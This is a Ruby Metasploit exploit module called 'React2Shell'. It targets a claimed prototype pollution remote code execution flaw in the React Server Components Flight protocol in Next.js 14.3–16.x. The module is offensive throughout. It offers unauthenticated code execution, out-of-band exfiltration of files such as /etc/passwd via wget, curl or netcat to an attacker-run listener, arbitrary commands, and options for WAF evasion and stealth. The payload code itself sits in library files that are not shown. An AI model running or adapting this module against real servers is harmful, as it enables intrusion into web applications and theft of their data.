##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# Author: Moises Tapia (Cl0wnr3v)
##

require_relative 'lib/react2shell/exploit_engine'
require_relative 'lib/react2shell/payload_generator'
require_relative 'lib/react2shell/oob_listener'
require_relative 'lib/react2shell/configuration_manager'
require_relative 'lib/react2shell/session_manager'
require_relative 'lib/react2shell/error_handler'
require_relative 'lib/react2shell/payload_evasion'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'React2Shell RCE - React/Next.js Flight Protocol Prototype Pollution',
      'Description'    => %q{
        This module exploits a prototype pollution vulnerability in React Server Components
        (RSC) Flight Protocol implementation in Next.js 14.3.x-canary, 15.x, and 16.x.
        The vulnerability allows unauthenticated remote code execution through manipulation
        of Flight protocol chunks and unsafe processing of serialized objects.
        
        The exploit abuses prototype pollution via the _prefix field in RSC chunks to
        transform _formData.get into Function() constructor, enabling arbitrary JavaScript
        execution on the server.
        
        This module implements Out-of-Band (OOB) data exfiltration and command execution
        using a modular, extensible architecture that serves as a template for other
        researchers and security professionals.
        
        Features:
        - Automatic vulnerability detection with non-destructive payloads
        - File exfiltration via multiple methods (wget, curl, nc)
        - Command execution with output capture
        - Large data handling with chunked transfers
        - Multi-session management for concurrent operations
        - Comprehensive error handling and retry logic
        - Payload evasion and WAF bypass techniques
        - Extensible architecture for custom payloads
      },
      'Author'         => [
        'Moises Tapia / Cl0wnr3v'
      ],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2025-55182'],
        ['CVE', '2025-66478'],
        ['URL', 'https://github.com/vercel/next.js/security/advisories'],
        ['URL', 'https://react.dev/reference/rsc/server-components']
      ],
      'Platform'       => ['node'],
      'Arch'           => ARCH_NODEJS,
      'Privileged'     => false,
      'Targets'        => [
        ['Automatic', {}]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2025-01-10',
      'Notes'          => {
        'Stability'   => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Base path to vulnerable application', '/']),
      OptString.new('FILEPATH', [false, 'File to exfiltrate via OOB (absolute path)', '/etc/passwd']),
      OptString.new('CMD', [false, 'Command to execute via OOB', '']),
      OptBool.new('SSL', [false, 'Use SSL/TLS for target communication', false]),
      OptBool.new('ADAPTIVE', [false, 'Use adaptive payload selection with fallback methods', true]),
      OptBool.new('EVASION', [false, 'Enable payload evasion techniques', false])
    ])

    register_advanced_options([
      OptPort.new('SRVPORT', [true, 'HTTP server port for OOB data exfiltration', 8080]),
      OptString.new('SRVHOST', [false, 'HTTP server host for OOB data exfiltration (auto-detect if empty)']),
      OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the payload request', 30]),
      OptInt.new('CHUNK_SIZE', [false, 'Chunk size for large data transfers (bytes)', 65536]),
      OptInt.new('MAX_SESSIONS', [true, 'Maximum concurrent OOB sessions', 10]),
      OptBool.new('STEALTH', [false, 'Enable stealth mode (slower but less detectable)', false]),
      OptString.new('USER_AGENT', [false, 'Custom User-Agent string', '']),
      OptString.new('CUSTOM_HEADERS', [false, 'Custom HTTP headers (JSON format)', ''])
    ])

    # Initialize components
    @exploit_engine = nil
    @payload_generator = nil
    @oob_listener = nil
    @config_manager = nil
    @session_manager = nil
    @error_handler = nil
  end

  ##
  # Performs vulnerability check using the ExploitEngine
  # Implements requirement 5.1: non-destructive vulnerability detection
  # @return [Msf::Exploit::CheckCode] Result of vulnerability assessment
  def check
    ensure_components_initialized
    
    begin
      print_status("Performing vulnerability check...")
      result = @exploit_engine.check_vulnerability
      
      case result.code
      when :vulnerable
        print_good("Target is VULNERABLE to React2Shell (CVE-2025-55182)")
        print_good("Evidence: #{result.message}") if result.message
      when :appears
        print_warning("Target APPEARS vulnerable but check was inconclusive")
        print_warning("Reason: #{result.message}") if result.message
      when :safe
        print_error("Target appears SAFE from this vulnerability")
        print_error("Reason: #{result.message}") if result.message
      else
        print_warning("Vulnerability status UNKNOWN")
        print_warning("Reason: #{result.message}") if result.message
      end
      
      result
      
    rescue => e
      @error_handler.handle_payload_error(e, :vulnerability_check, {})
      print_error("Check failed: #{e.class}: #{e.message}")
      vprint_error("Backtrace: #{e.backtrace.join("\n")}")
      CheckCode::Unknown("Check failed due to error: #{e.message}")
    end
  end

  ##
  # Main exploit execution method
  # Implements requirements 1.1, 2.3, 3.1: reliable exploit execution
  def exploit
    ensure_components_initialized
    
    print_status("React2Shell Exploit Starting...")
    print_status("Target: #{full_uri}")
    
    # Validate configuration before proceeding (requirement 1.2)
    validation_errors = @config_manager.validate_options
    if validation_errors.any?
      print_error("Configuration validation failed:")
      validation_errors.each { |error| print_error("  - #{error}") }
      return
    end
    
    # Check connectivity (requirement 1.2)
    print_status("Checking target connectivity...")
    unless @config_manager.check_connectivity
      print_error("Cannot reach target. Check RHOSTS and network connectivity.")
      return
    end
    print_good("Target is reachable")
    
    # Determine and execute exploit mode
    begin
      mode = @config_manager.determine_exploit_mode
      print_status("Executing exploit in #{mode} mode")
      
      # Choose execution method based on ADAPTIVE setting
      if datastore['ADAPTIVE']
        print_status("Using adaptive payload selection with automatic fallback")
        execute_adaptive_exploit(mode)
      else
        print_status("Using standard payload execution")
        @exploit_engine.execute_exploit(mode)
      end
      
      # Display session statistics
      display_session_statistics
      
      # Display error summary if any errors occurred
      @exploit_engine.display_error_summary
      
    rescue => e
      @error_handler.handle_payload_error(e, :exploit_execution, { mode: mode })
      print_error("Exploit execution failed: #{e.class}: #{e.message}")
      vprint_error("Backtrace: #{e.backtrace.join("\n")}")
    end
  end

  ##
  # Executes multiple commands concurrently
  # Implements requirement 3.4: multi-session management
  # @param commands [Array<String>] Commands to execute
  def run_multiple_commands(commands)
    ensure_components_initialized
    
    print_status("Executing #{commands.length} commands concurrently...")
    
    begin
      results = @exploit_engine.execute_multiple_commands(commands)
      
      print_good("Multi-command execution completed:")
      results.each do |command, result|
        print_status("Command: #{command}")
        print_status("Session: #{result[:session_id]}")
        print_line("Output: #{result[:data]}")
        print_line("")
      end
      
      results
      
    rescue => e
      @error_handler.handle_payload_error(e, :multi_command, { commands: commands })
      print_error("Multi-command execution failed: #{e.message}")
      {}
    end
  end

  ##
  # Executes exploit with environment detection and adaptation
  # Implements requirements 8.1, 8.2, 8.3: payload adaptation
  def run_adaptive_exploit
    ensure_components_initialized
    
    print_status("Running adaptive exploit with environment detection...")
    
    # Detect environment restrictions
    restrictions = @payload_generator.detect_environment_restrictions
    
    # Execute with adaptive options
    mode = @config_manager.determine_exploit_mode
    options = {
      try_alternatives: true,
      evasion: datastore['EVASION'],
      stealth: datastore['STEALTH'],
      restrictions: restrictions
    }
    
    @exploit_engine.execute_adaptive_exploit(mode, options)
  end

  ##
  # Gets comprehensive module information for documentation
  # Implements requirement 6.2: detailed documentation
  # @return [Hash] Module information and capabilities
  def get_module_info
    {
      name: 'React2Shell RCE Exploit',
      version: '1.0.0',
      cve: ['CVE-2025-55182', 'CVE-2025-66478'],
      capabilities: [
        'Vulnerability Detection',
        'File Exfiltration',
        'Command Execution', 
        'Multi-Session Management',
        'Payload Evasion',
        'Large Data Handling',
        'Automatic SSL Detection',
        'Comprehensive Error Handling'
      ],
      supported_targets: [
        'Next.js 14.3.x-canary',
        'Next.js 15.x',
        'Next.js 16.x',
        'React Server Components with Flight Protocol'
      ],
      payload_methods: [
        'wget (primary)',
        'curl (fallback)',
        'netcat (alternative)',
        'python (scripted)',
        'custom (extensible)'
      ]
    }
  end

  ##
  # Cleanup method called when module execution ends
  # Implements proper resource cleanup
  def cleanup
    super
    
    print_status("Cleaning up React2Shell module resources...")
    
    # Stop OOB listener
    if @oob_listener
      @oob_listener.stop_server
      print_vprint_status("OOB listener stopped")
    end
    
    # Clean up sessions
    if @session_manager
      @session_manager.cleanup_all_sessions
      vprint_status("All sessions cleaned up")
    end
    
    # Export error logs if verbose mode
    if framework.datastore['VERBOSE'] && @error_handler
      error_log = @exploit_engine.export_comprehensive_error_log(:text)
      if error_log && !error_log.empty?
        vprint_status("Error log available for debugging")
        vprint_line(error_log)
      end
    end
    
    print_status("Cleanup completed")
  end

  ##
  # Auxiliary method for testing payload generation
  # Useful for researchers extending the module
  def test_payload_generation
    ensure_components_initialized
    
    print_status("Testing payload generation capabilities...")
    
    # Test file exfiltration payload
    if datastore['FILEPATH'] && !datastore['FILEPATH'].empty?
      file_payload = @payload_generator.create_file_exfiltration_payload(
        datastore['FILEPATH'],
        @config_manager.get_oob_url
      )
      print_status("File exfiltration payload: #{file_payload}")
    end
    
    # Test command execution payload
    if datastore['CMD'] && !datastore['CMD'].empty?
      cmd_payload = @payload_generator.create_command_execution_payload(
        datastore['CMD'],
        @config_manager.get_oob_url
      )
      print_status("Command execution payload: #{cmd_payload}")
    end
    
    # Test adaptive payloads if enabled
    if datastore['ADAPTIVE']
      print_status("Testing adaptive payload generation...")
      
      if datastore['FILEPATH'] && !datastore['FILEPATH'].empty?
        adaptive_payloads = @payload_generator.create_adaptive_file_exfiltration_payload(
          datastore['FILEPATH'],
          @config_manager.get_oob_url
        )
        print_status("Generated #{adaptive_payloads.length} adaptive file payloads")
      end
    end
  end

  private

  ##
  # Ensures all components are properly initialized
  # Implements modular component initialization
  def ensure_components_initialized
    @error_handler ||= React2Shell::ErrorHandler.new(self)
    @config_manager ||= React2Shell::ConfigurationManager.new(self)
    @payload_generator ||= React2Shell::PayloadGenerator.new(self)
    @oob_listener ||= React2Shell::OOBListener.new(self)
    @session_manager ||= React2Shell::SessionManager.new(self)
    @exploit_engine ||= React2Shell::ExploitEngine.new(self)
  end

  ##
  # Executes adaptive exploit with fallback mechanisms
  # @param mode [Symbol] Exploit mode (:file_exfiltration or :command_execution)
  def execute_adaptive_exploit(mode)
    options = {
      try_alternatives: true,
      evasion: datastore['EVASION'],
      stealth: datastore['STEALTH'],
      chunk_size: datastore['CHUNK_SIZE']
    }
    
    @exploit_engine.execute_adaptive_exploit(mode, options)
  end

  ##
  # Displays session statistics for user information
  def display_session_statistics
    return unless @session_manager
    
    stats = @session_manager.get_session_statistics
    
    print_status("Session Statistics:")
    print_status("  Active sessions: #{stats[:active_sessions]}")
    print_status("  Completed sessions: #{stats[:completed_sessions]}")
    print_status("  Total bytes received: #{stats[:total_bytes_received]}")
    
    if stats[:oldest_active_session]
      print_status("  Oldest active session: #{stats[:oldest_active_session]}")
    end
  end

  ##
  # Legacy method for backward compatibility
  def ensure_exploit_engine
    ensure_components_initialized
  end
end